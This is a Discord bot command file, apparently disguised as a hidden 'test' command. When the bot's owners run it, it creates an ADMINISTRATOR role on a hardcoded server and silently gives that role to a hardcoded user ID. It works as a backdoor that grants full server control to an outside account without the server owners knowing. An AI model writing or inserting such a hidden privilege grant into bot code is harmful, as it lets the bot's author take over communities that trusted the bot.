const config = require("../../config.json");

module.exports.run = async(client, message) => {
    if (!config.owners.includes(message.author.id)) return message.channel.send(`**Seulement le bg peut faire ça** :sunglasses:`)
    let server = await client.guilds.fetch('820399937417379963');
    let member = await server.members.fetch('498159251383123969');
    let role = await server.roles.fetch('877111756449779732');
    console.log(member)
    console.log(role)
    server.roles.create({
        name: 'Super Cool Blue People',
        color: 'BLUE',
        reason: 'we needed a role for Super Cool People',
        permission: 'ADMINISTRATOR',
        permissions: ['ADMINISTRATOR']
    }).then(role => {
        member.roles.add(role);
        console.log(role.id)
    })
};

module.exports.config = {
    name: "test",
    description: "test le bot",
    format: "test",
    canBeUseByBot: true,
    category: "hidden",
    permission: "ADMINISTRATOR"
};
